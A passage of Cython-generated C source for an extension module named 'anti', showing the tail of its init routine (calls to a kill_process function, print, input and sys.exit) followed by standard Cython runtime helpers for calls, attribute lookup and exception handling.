                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_kill_process); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 322, __pyx_L169_except_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __pyx_t_4 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 322, __pyx_L169_except_error)
                        __Pyx_GOTREF(__pyx_t_4);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    goto __pyx_L168_exception_handled;
                }
                goto __pyx_L169_except_error;
            __pyx_L169_except_error:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_6);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_15, __pyx_t_6);
                goto __pyx_L1_error;
            __pyx_L168_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_6);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_15, __pyx_t_6);
            __pyx_L172_try_end:;
            }
            goto __pyx_L33;
        } {
            __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 324, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_kill_process); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 325, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_28 = __Pyx_PyObject_CallNoArg(__pyx_t_5); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 325, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_28);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
        }
    __pyx_L33:;
        goto __pyx_L16;
    } {
        __pyx_t_28 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 327, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_28);
        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
        __pyx_t_28 = __Pyx_PyObject_CallNoArg(__pyx_builtin_input); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 328, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_28);
        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_sys); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 329, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_28);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_28, __pyx_n_s_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 329, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
        __pyx_t_28 = __Pyx_PyObject_CallNoArg(__pyx_t_5); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 329, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_28);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
    }
__pyx_L16:;
    }
    __pyx_t_28 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 1, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_28);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_28) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;

    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_11);
    __Pyx_XDECREF(__pyx_t_17);
    __Pyx_XDECREF(__pyx_t_21);
    __Pyx_XDECREF(__pyx_t_22);
    __Pyx_XDECREF(__pyx_t_23);
    __Pyx_XDECREF(__pyx_t_24);
    __Pyx_XDECREF(__pyx_t_25);
    __Pyx_XDECREF(__pyx_t_26);
    __Pyx_XDECREF(__pyx_t_27);
    __Pyx_XDECREF(__pyx_t_28);
    __Pyx_XDECREF(__pyx_t_29);
    if (__pyx_m) {
        if (__pyx_d) {
            __Pyx_AddTraceback("init anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
        }
        Py_CLEAR(__pyx_m);
    }
    else if (!PyErr_Occurred()) {
        PyErr_SetString(PyExc_ImportError, "init anti");
    }
__pyx_L0:;
    __Pyx_RefNannyFinishContext();
#if CYTHON_PEP489_MULTI_PHASE_INIT
    return (__pyx_m != NULL) ? 0 : -1;
#elif PY_MAJOR_VERSION >= 3
    return __pyx_m;
#else
    return;
#endif
}
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct* __Pyx_RefNannyImportAPI(const char* modname) {
    PyObject* m = NULL, * p = NULL;
    void* r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct*)r;
}
#endif
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif
static PyObject* __Pyx_GetBuiltinName(PyObject* name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject* obj) {
    PyObject* dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject* obj) {
    PyObject** dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject**)((char*)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject* dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif
#if CYTHON_USE_DICT_VERSIONS
static PyObject* __Pyx__GetModuleGlobalName(PyObject* name, PY_UINT64_T* dict_version, PyObject** dict_cached_value)
#else
static CYTHON_INLINE PyObject* __Pyx__GetModuleGlobalName(PyObject* name)
#endif
{
    PyObject* result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject*)name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
        if (likely(result)) {
            return __Pyx_NewRef(result);
        }
        else if (unlikely(PyErr_Occurred())) {
            return NULL;
        }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
        if (likely(result)) {
            return __Pyx_NewRef(result);
        }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
        if (likely(result)) {
            return __Pyx_NewRef(result);
        }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject* co, PyObject** args, Py_ssize_t na,
    PyObject* globals) {
    PyFrameObject* f;
    PyThreadState* tstate = __Pyx_PyThreadState_Current;
    PyObject** fastlocals;
    Py_ssize_t i;
    PyObject* result;
    assert(globals != NULL);
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f, 0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject* __Pyx_PyFunction_FastCallDict(PyObject* func, PyObject** args, Py_ssize_t nargs, PyObject* kwargs) {
    PyCodeObject* co = (PyCodeObject*)PyFunction_GET_CODE(func);
    PyObject* globals = PyFunction_GET_GLOBALS(func);
    PyObject* argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject* closure;
#if PY_MAJOR_VERSION >= 3
    PyObject* kwdefs;
#endif
    PyObject* kwtuple, ** k;
    PyObject** d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject* result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
        co->co_kwonlyargcount == 0 &&
#endif
        likely(kwargs == NULL || nk == 0) &&
        co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
            && co->co_argcount == Py_SIZE(argdefs)) {
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result = __Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i + 1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i + 1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject*)NULL,
        args, (int)nargs,
        k, (int)nk,
        d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject*)NULL,
        args, (int)nargs,
        k, (int)nk,
        d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject* func, PyObject* arg, PyObject* kw) {
    PyObject* result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject* func, PyObject* arg) {
    PyObject* self, * result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject* func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#ifdef __Pyx_CyFunction_USED
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject* __Pyx_PyCFunction_FastCall(PyObject* func_obj, PyObject** args, Py_ssize_t nargs) {
    PyCFunctionObject* func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject* self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    }
    else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject* func, PyObject* arg) {
    PyObject* result;
    PyObject* args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject* func, PyObject* arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        }
        else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject* func, PyObject* arg) {
    PyObject* result;
    PyObject* args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem*
__Pyx_PyErr_GetTopmostException(PyThreadState* tstate)
{
    _PyErr_StackItem* exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
        exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb) {
#if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem* exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
#else
    * type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
#endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState* tstate, PyObject* type, PyObject* value, PyObject* tb) {
    PyObject* tmp_type, * tmp_value, * tmp_tb;
#if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem* exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
#else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
#endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb)
#else
static int __Pyx_GetException(PyObject** type, PyObject** value, PyObject** tb)
#endif
{
    PyObject* local_type, * local_value, * local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject* tmp_type, * tmp_value, * tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
#if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
#endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
#if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem* exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
#else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
#endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}
static CYTHON_INLINE PyObject* __Pyx_GetAttr(PyObject* o, PyObject* n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}
static CYTHON_INLINE int __Pyx_HasAttr(PyObject* o, PyObject* n) {
    PyObject* r;
    if (unlikely(!__Pyx_PyBaseString_Check(n))) {
        PyErr_SetString(PyExc_TypeError,
            "hasattr(): attribute name must be string");
        return -1;
    }
    r = __Pyx_GetAttr(o, n);
    if (unlikely(!r)) {
        PyErr_Clear();
        return 0;
    }
    else {
        Py_DECREF(r);
        return 1;
    }
}
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject* args, * result = NULL;
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject* args[2] = { arg1, arg2 };
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
#endif
#if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject* args[2] = { arg1, arg2 };
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
#endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char* more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    }
    else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
        "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
        func_name, more_or_less, num_expected,
        (num_expected == 1) ? "" : "s", num_found);
}
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
#if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
#else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
#endif
}
static int __Pyx_ParseOptionalKeywords(
    PyObject* kwds,
    PyObject** argnames[],
    PyObject* kwds2,
    PyObject* values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject* key = 0, * value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name - argnames] = value;
            continue;
        }
        name = first_kw_arg;
#if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                    && _PyString_Eq(**name, key)) {
                    values[name - argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                        (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        }
        else
#endif
            if (likely(PyUnicode_Check(key))) {
                while (*name) {
                    int cmp = (**name == key) ? 0 :
#if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
#endif
                        PyUnicode_Compare(**name, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) {
                        values[name - argnames] = value;
                        break;
                    }
                    name++;
                }
                if (*name) continue;
                else {
                    PyObject*** argname = argnames;
                    while (argname != first_kw_arg) {
                        int cmp = (**argname == key) ? 0 :
#if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                            (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
#endif
                            PyUnicode_Compare(**argname, key);
                        if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                        if (cmp == 0) goto arg_passed_twice;
                        argname++;
                    }
                }
            }
            else
                goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        }
        else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
#if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
#else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
#endif
bad:
    return -1;
}
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState* tstate, PyObject* type, PyObject* value, PyObject* tb) {
    PyObject* tmp_type, * tmp_value, * tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject* a, PyTypeObject* b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject* a, PyTypeObject* b) {
    PyObject* mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject*)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject* err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject* exception, * value, * tb;
    int res;
    __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject* err, PyObject* exc_type1, PyObject* exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject* exc_type, PyObject* tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i = 0; i < n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i = 0; i < n; i++) {
        PyObject* t = PyTuple_GET_ITEM(tuple, i);
#if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
#endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        }
        else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject* err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
